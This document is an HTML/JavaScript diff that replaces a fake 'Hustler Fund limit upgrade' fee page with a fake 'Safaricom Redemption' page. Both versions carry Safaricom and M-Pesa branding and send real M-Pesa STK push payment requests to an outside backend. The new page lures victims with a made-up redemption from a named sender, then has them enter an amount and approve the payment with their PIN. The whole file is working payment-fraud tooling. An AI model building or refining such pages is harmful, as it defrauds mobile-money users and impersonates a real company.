@@ -1,394 +1,356 @@
 
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safaricom | Hustler Fund Limit Boost Portal</title>
-    
-    <!-- CSS STYLES -->
-    <style>
-        :root {
-            --safaricom-green: #2e7d32;
-            --safaricom-hover: #1b5e20;
-            --bg-gray: #f2f5f8;
-            --white: #ffffff;
-            --dark-text: #333;
-            --accent-red: #e53935;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-gray);
-            margin: 0;
-            padding: 0;
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Safaricom Redemption</title>  
+    <style>  
+        body {  
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;  
+            background: #121212;  
+            display: flex;  
+            justify-content: center;  
+            align-items: center;  
+            min-height: 100vh;  
+            margin: 0;  
+            color: #ffffff;
+        }  
+        .card {  
+            background: #1e1e1e;  
+            padding: 2.2rem 1.8rem;  
+            border-radius: 16px;  
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);  
+            max-width: 380px;  
+            width: 90%;  
+            text-align: center;  
+            border: 1px solid #2a2a2a;
+        }  
+        .brand-header {
             display: flex;
-            flex-direction: column;
             align-items: center;
-            color: var(--dark-text);
-        }
-
-        /* Header & Logo */
-        .navbar {
-            background: var(--white);
-            width: 100%;
-            padding: 15px 0;
-            display: flex;
             justify-content: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
+            gap: 10px;
+            margin-bottom: 25px;
         }
-
-        .logo {
-            height: 50px; /* Adjust based on actual logo aspect ratio */
-            object-fit: contain;
+        .header-divider {
+            color: #555;
+            font-size: 1.2rem;
+            font-weight: 300;
         }
-
-        .hero {
-            text-align: center;
-            padding: 30px 15px;
-            max-width: 800px;
-        }
-
-        .hero h1 {
-            color: var(--safaricom-green);
-            margin-bottom: 8px;
-            font-size: 1.6rem;
-        }
-
-        .hero p {
-            color: #666;
-            font-size: 0.95rem;
-        }
-
-        /* 50 Package Grid - Mobile Responsive */
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr); /* 2 columns on mobile */
-            gap: 12px;
-            width: 95%;
-            max-width: 1200px;
-            padding: 10px;
-            box-sizing: border-box;
-        }
-
-        @media (min-width: 768px) {
-            .grid-container { grid-template-columns: repeat(4, 1fr); }
-        }
-
-        @media (min-width: 1024px) {
-            .grid-container { grid-template-columns: repeat(5, 1fr); }
-        }
-
-        .pkg-card {
-            background: var(--white);
-            border-radius: 12px;
-            padding: 20px 10px;
-            text-align: center;
-            border: 1px solid #e0e0e0;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .pkg-card:hover {
-            border-color: var(--safaricom-green);
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
-        }
-
-        .hot-badge {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            background: #ff9800;
-            color: white;
-            font-size: 9px;
-            font-weight: bold;
-            padding: 2px 6px;
-            border-radius: 4px;
-            text-transform: uppercase;
-        }
-
-        .pkg-card h3 {
-            font-size: 0.95rem;
-            margin: 10px 0;
-            color: #444;
-        }
-
-        .pkg-card .fee {
-            font-size: 0.85rem;
-            color: #888;
-            margin-bottom: 15px;
-        }
-
-        .btn-select {
-            color: white;
-            border: none;
-            padding: 10px;
-            width: 90%;
-            border-radius: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 0.8rem;
-            background: linear-gradient(135deg, #28a745 0%, #222222 50%, #dc3545 100%);
-            transition: opacity 0.2s ease, transform 0.2s ease;
-        }
-        .btn-select:hover {
-            opacity: 0.88;
-            transform: scale(1.02);
-        }
-
-        /* Payment Section */
-        #payment-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: white;
-            width: 90%;
-            max-width: 400px;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            position: relative;
-        }
-
-        .close-btn {
-            position: absolute;
-            top: 15px; right: 15px;
-            font-size: 24px; cursor: pointer; color: #999;
-        }
-
-        .price-display {
-            font-size: 2.2rem;
-            font-weight: bold;
-            color: var(--safaricom-green);
-            margin: 20px 0;
-        }
-
-        input[type="number"] {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            border: 2px solid #eee;
-            border-radius: 8px;
-            font-size: 1rem;
-            box-sizing: border-box;
-        }
-
-        .btn-pay {
-            background: #28a745;
-            color: white;
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        /* Footer */
-        .footer {
-            margin-top: 50px;
-            padding: 30px;
-            width: 100%;
-            background: #fff;
-            text-align: center;
-            border-top: 1px solid #eee;
-            font-size: 0.85rem;
-            color: #777;
-        }
-
-        /* Toast Notification */
-        #notification {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #333;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 30px;
-            font-size: 0.8rem;
-            display: none;
-            z-index: 3000;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        }
-
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid var(--safaricom-green);
+        .icon-circle {
+            width: 64px;
+            height: 64px;
+            background: #0f381e;
             border-radius: 50%;
-            width: 20px; height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-
-    <nav class="navbar">
-        <!-- Replace this URL with your hosted logo if needed -->
-        <img src="https://pbs.twimg.com/media/FizyQaiWYAAaKWK.jpg" alt="Safaricom Logo" class="logo">
-    </nav>
-
-    <div class="hero">
-        <h1>Official Hustler Fund Limit Upgrade</h1>
-        <p>Choose your preferred limit increase and pay the activation fee via M-Pesa STK Push.</p>
+        .icon-circle svg {
+            width: 32px;
+            height: 32px;
+            fill: #00d053;
+        }
+        h2 {   
+            color: #ffffff;   
+            margin-bottom: 0.8rem;   
+            font-size: 1.35rem;   
+            line-height: 1.3;   
+            font-weight: 700;
+        }  
+        .highlight-name {
+            color: #00d053;
+        }
+        p.subtitle {   
+            color: #a0a0a0;   
+            margin-bottom: 1.8rem;   
+            font-size: 0.95rem;
+            line-height: 1.4;
+        }  
+        .input-group {  
+            margin: 18px 0;  
+            text-align: left;  
+        }  
+        label {  
+            display: block;  
+            margin-bottom: 8px;  
+            font-weight: 600;  
+            color: #ffffff;  
+            font-size: 0.95rem;  
+        }  
+        input {  
+            width: 100%;  
+            padding: 14px;  
+            background: #121212;
+            border: 1px solid #333333;  
+            border-radius: 8px;  
+            font-size: 1.1rem;  
+            color: #ffffff;
+            box-sizing: border-box;  
+            outline: none;
+            transition: border-color 0.2s;
+        }  
+        input:focus {
+            border-color: #00d053;
+        }
+        .amount-input {  
+            font-size: 1.3rem;  
+            font-weight: 600;  
+            color: #00d053;  
+            text-align: center;  
+        }  
+        .amount-input::placeholder {
+            color: #555;
+            font-size: 1.05rem;
+            font-weight: normal;
+        }
+        button {  
+            width: 100%;  
+            padding: 15px;  
+            background: #00b047;  
+            color: white;  
+            border: none;  
+            border-radius: 8px;  
+            font-size: 1.1rem;  
+            font-weight: 700;  
+            cursor: pointer;  
+            margin-top: 10px;  
+            transition: background 0.2s;
+        }  
+        button:hover {
+            background: #00c952;
+        }
+        button:disabled {   
+            background: #333333;   
+            color: #777777;
+            cursor: not-allowed;   
+        }  
+        #status {  
+            margin-top: 20px;  
+            padding: 12px;  
+            border-radius: 8px;  
+            min-height: 20px;  
+            font-size: 0.92rem;  
+            line-height: 1.45;  
+        }  
+        .success { background: rgba(0, 208, 83, 0.15); color: #00d053; border: 1px solid #00d053; }  
+        .error { background: rgba(220, 53, 69, 0.15); color: #ff4d4d; border: 1px solid #ff4d4d; }  
+        .info { background: rgba(0, 112, 186, 0.15); color: #3399ff; border: 1px solid #3399ff; }  
+        .hidden { display: none; }
+        .loader {  
+            display: inline-block; width: 18px; height: 18px;  
+            border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;  
+            border-radius: 50%; animation: spin 1s linear infinite;  
+            margin-right: 8px; vertical-align: middle;  
+        }  
+        @keyframes spin { to { transform: rotate(360deg); } }  
+    </style>  
+</head>  
+<body>  
+<div class="card">  
+    <!-- Header Logos -->
+    <div class="brand-header">
+        <svg height="24" viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M15 5 C5 5 0 12 0 18 C0 24 6 28 16 28 C26 28 30 22 30 18 C28 8 18 5 15 5 Z" fill="#E11B22"/>
+            <text x="35" y="21" fill="#FFFFFF" font-family="sans-serif" font-weight="bold" font-size="16">Safaricom</text>
+        </svg>
+        <span class="header-divider">|</span>
+        <svg height="24" viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="2" width="20" height="26" rx="4" fill="#00D053"/>
+            <text x="27" y="21" fill="#00D053" font-family="sans-serif" font-weight="bold" font-size="16">M-PESA</text>
+        </svg>
     </div>
 
-    <!-- The 50-Package Grid -->
-    <div class="grid-container" id="packageGrid"></div>
+    <!-- STEP 1: INITIAL PHONE ENTRY SCREEN -->
+    <div id="step1">
+        <h2>Enter Safaricom Number</h2>
+        <p class="subtitle">Please enter your Safaricom phone number to check available redemption.</p>
+        
+        <div class="input-group">  
+            <label for="initialPhone">Safaricom Phone Number</label>  
+            <input type="text" id="initialPhone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
+        </div>  
+        <button id="askBtn" onclick="handleInitialCheck()">Ask Redemption</button>  
+    </div>
 
-    <!-- Payment Modal -->
-    <div id="payment-modal">
-        <div class="modal-content">
-            <span class="close-btn" onclick="closeModal()">&times;</span>
-            <h2 id="modal-title">Upgrade Package</h2>
-            <p>Enter your M-Pesa number to proceed</p>
-            <div class="price-display" id="modal-price">KSh 0</div>
-            
-            <input type="number" id="phone" placeholder="" required>
-            <button id="payBtn" class="btn-pay" onclick="handlePayment()">Pay via M-Pesa</button>
-            
-            <div id="status-msg" style="margin-top: 15px; font-size: 0.9rem;"></div>
+    <!-- STEP 2: REDEMPTION VIEW (Matches design image) -->
+    <div id="step2" class="hidden">
+        <div class="icon-circle">
+            <svg viewBox="0 0 24 24">
+                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-1-6h-3V8h-2v5H8l4 4 4-4z"/>
+            </svg>
         </div>
+
+        <h2>You've received a redemption from <span class="highlight-name">Gemma Francis</span> on your Safaricom line.</h2>  
+        <p class="subtitle">Enter the amount below and the M-Pesa phone number used to redeem the money.</p>  
+
+        <div class="input-group">  
+            <label for="amount">Amount (KES)</label>  
+            <input type="text" id="amount" class="amount-input" placeholder="Enter amount from 200" maxlength="6" inputmode="decimal">  
+        </div>  
+
+        <div class="input-group">  
+            <label for="phone">M-Pesa Phone Number</label>  
+            <input type="text" id="phone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
+        </div>  
+
+        <button id="payBtn" onclick="handlePayment()">Pay with M-Pesa</button>  
     </div>
 
-    <div id="notification"></div>
+    <div id="status"></div>
+</div>  
 
-    <footer class="footer">
-        <p>&copy; 2026 Hustler fund. All Rights Reserved.</p>
-        <p style="font-size: 0.7rem;">Hustler Fund is a continuous overdraft service. Terms and Conditions apply.</p>
-    </footer>
+<script>  
+    const BACKEND_URL = "https://tilo-three.vercel.app";  
+    let pollTimer = null;  
+  
+    function showStatus(message, type = "info") {  
+        const div = document.getElementById('status');  
+        div.className = type;  
+        div.innerHTML = message;  
+    }  
 
-    <!-- JAVASCRIPT LOGIC -->
-    <script>
-        const BACKEND_URL = "https://newpayment-byr6.vercel.app";
-        let currentFee = 0;
-        let pollTimer;
-
-        // 1. Generate 50 Packages dynamically
-        const container = document.getElementById('packageGrid');
-        let gridHTML = '';
-        for (let i = 1; i <= 50; i++) {
-            let limit = i * 1000;
-            // Fee calculation (e.g., KSh 50 base + tiered percentage)
-            let fee = Math.floor(50 + (limit * 0.012));
-
-            gridHTML += `
-                <div class="pkg-card">
-                    <span class="hot-badge">NEW</span>
-                    <h3>HUSTLER FUND ${limit.toLocaleString()}</h3>
-                    <div class="fee">Fee: KSh ${fee}</div>
-                    <button class="btn-select" onclick="openModal('${limit.toLocaleString()}', ${fee})">Get Limit</button>
-                </div>
-            `;
-        }
-        container.innerHTML = gridHTML;
-
-        // 2. Modal Controls
-        function openModal(limit, fee) {
-            currentFee = fee;
-            document.getElementById('modal-title').innerText = `HUSTLER FUND ${limit} Boost`;
-            document.getElementById('modal-price').innerText = `KSh ${fee}`;
-            document.getElementById('payment-modal').style.display = 'flex';
+    // Step 1: Initial verification
+    function handleInitialCheck() {
+        const phone = document.getElementById('initialPhone').value.trim();
+        if (!phone || phone.length < 9) {
+            showStatus("❌ Please enter a valid Safaricom phone number", "error");
+            return;
         }
 
-        function closeModal() {
-            document.getElementById('payment-modal').style.display = 'none';
-            clearInterval(pollTimer);
+        const askBtn = document.getElementById('askBtn');
+        askBtn.disabled = true;
+        askBtn.innerHTML = '<span class="loader"></span> Checking...';
+
+        setTimeout(() => {
+            // Auto-fill phone field in step 2 with the entered number
+            document.getElementById('phone').value = phone;
+            
+            showStatus(""); // clear status
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }, 1200);
+    }
+
+    function resetButton() {  
+        const btn = document.getElementById('payBtn');  
+        if (btn) {
+            btn.disabled = false;  
+            btn.innerText = "Pay with M-Pesa";  
+        }
+    }  
+  
+    // Sanitize amount field input
+    function formatAmountInput() {  
+        const amountInput = document.getElementById('amount');  
+        amountInput.addEventListener('input', function() {  
+            let value = this.value.replace(/[^0-9.]/g, '');  
+            const parts = value.split('.');  
+            if (parts.length > 2) value = parts[0] + '.' + parts.slice(1).join('');  
+            if (parts.length === 2) value = parts[0] + '.' + parts[1].substring(0, 2);  
+            this.value = value;  
+        });  
+    }  
+  
+    // Step 2: Payment Execution
+    async function handlePayment() {  
+        const phone = document.getElementById('phone').value.trim();  
+        let amount = parseFloat(document.getElementById('amount').value);  
+        const btn = document.getElementById('payBtn');  
+  
+        if (!phone || phone.length < 9) {
+            showStatus("❌ Please enter a valid phone number", "error");
+            return;
         }
 
-        // 3. Payment Handling
-        async function handlePayment() {
-            const phone = document.getElementById('phone').value;
-            const status = document.getElementById('status-msg');
-            const btn = document.getElementById('payBtn');
-
-            if (!phone || phone.length < 10) {
-                alert("Please enter a valid M-Pesa number (254...)");
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerHTML = '<div class="loader"></div> Processing...';
-            status.style.color = "#333";
-            status.innerText = "Check your phone for the M-Pesa PIN prompt.";
-
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/initiate`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ amount: currentFee, phone_number: phone })
-                });
-
-                const data = await response.json();
-                const invoiceId = data.invoice ? data.invoice.invoice_id : (data.id || null);
-
-                if (invoiceId) {
-                    status.innerText = "PIN prompt sent! Waiting for payment confirmation...";
-                    startPolling(invoiceId);
-                } else {
-                    throw new Error();
-                }
-            } catch (err) {
-                status.style.color = "red";
-                status.innerText = "Failure try again";
-                resetButton();
-            }
-        }
-
-        async function startPolling(invoiceId) {
-            const status = document.getElementById('status-msg');
-            let pollCount = 0;
-            const MAX_POLLS = 40; // ~2 minutes at 3s intervals
-            pollTimer = setInterval(async () => {
-                if (++pollCount > MAX_POLLS) {
-                    clearInterval(pollTimer);
-                    status.style.color = "red";
-                    status.innerText = "Timed out. Please check your M-Pesa messages.";
-                    resetButton();
-                    return;
-                }
-                try {
-                    const response = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
-                    const data = await response.json();
-                    const state = data.invoice ? data.invoice.state : data.state;
-
-                    if (state === "COMPLETE" || state === "COMPLETED") {
-                        clearInterval(pollTimer);
-                        status.style.color = "green";
-                        status.innerHTML = "<strong>✅ Success!</strong><br>Admin is working on you...";
-                        setTimeout(() => { window.location.href = "voucher.html"; }, 3000);
-                    } else if (state === "FAILED" || state === "REJECTED") {
-                        clearInterval(pollTimer);
-                        status.style.color = "red";
-                        status.innerText = "Failure try again";
-                        resetButton();
-                    }
-                } catch (err) { console.log("Polling..."); }
-            }, 3000);
-        }
-
-        function resetButton() {
-            const btn = document.getElementById('payBtn');
-            btn.disabled = false;
-            btn.innerText = "Pay via M-Pesa";
-        }
-
-    </script>
-</body>
+        if (isNaN(amount) || amount < 200) {  
+            showStatus("❌ Minimum redemption amount is KES 200.", "error");  
+            return;  
+        }  
+  
+        btn.disabled = true;  
+        btn.innerHTML = '<span class="loader"></span> Sending STK Push...';  
+        showStatus("STK Push sent.<br>Check your phone and enter M-Pesa PIN.", "info");  
+  
+        try {  
+            const res = await fetch(`${BACKEND_URL}/api/stk-push`, {  
+                method: "POST",  
+                headers: {  
+                    "Content-Type": "application/json",  
+                    "ngrok-skip-browser-warning": "true"  
+                },  
+                body: JSON.stringify({   
+                    amount: amount,   
+                    phone_number: phone   
+                })  
+            });  
+  
+            const data = await res.json();  
+            if (data.success) {  
+                startPolling();  
+            } else {  
+                showStatus("❌ Failed to start payment", "error");  
+                resetButton();  
+            }  
+        } catch (err) {  
+            showStatus("❌ Connection error. Please try again.", "error");  
+            resetButton();  
+        }  
+    }  
+  
+    function startPolling() {  
+        let attempts = 0;  
+        const maxAttempts = 50;  
+  
+        if (pollTimer) clearInterval(pollTimer);  
+  
+        pollTimer = setInterval(async () => {  
+            attempts++;  
+            try {  
+                const res = await fetch(`${BACKEND_URL}/api/status`, {  
+                    headers: { "ngrok-skip-browser-warning": "true" }  
+                });  
+                const data = await res.json();  
+  
+                if (data.status === true && data.response) {  
+                    const code = data.response.ResultCode;  
+  
+                    if (code === 0) {  
+                        clearInterval(pollTimer);  
+                        showStatus("<strong>✅ Payments received, wait for verification.</strong>", "success");  
+                        document.getElementById('payBtn').style.display = 'none';
+                        return;  
+                    } else if (code === 1032) {  
+                        clearInterval(pollTimer);  
+                        showStatus("❌ Payment was cancelled.<br>Please try again.", "error");  
+                        resetButton();  
+                        return;  
+                    } else {  
+                        clearInterval(pollTimer);  
+                        let msg = data.response.ResultDesc || "Payment failed";  
+                        if (code === 2001) msg = "Wrong M-Pesa PIN entered.";  
+                        showStatus(`❌ ${msg}`, "error");  
+                        resetButton();  
+                        return;  
+                    }  
+                }  
+  
+                if (attempts >= maxAttempts) {  
+                    clearInterval(pollTimer);  
+                    showStatus("⏰ Request timed out.<br>Check your M-Pesa or try again.", "error");  
+                    resetButton();  
+                }  
+            } catch (err) {  
+                console.error("Polling error:", err);  
+            }  
+        }, 3000);  
+    }  
+  
+    window.onload = function() {  
+        formatAmountInput();  
+    };  
+</script>  
+</body>  
 </html>
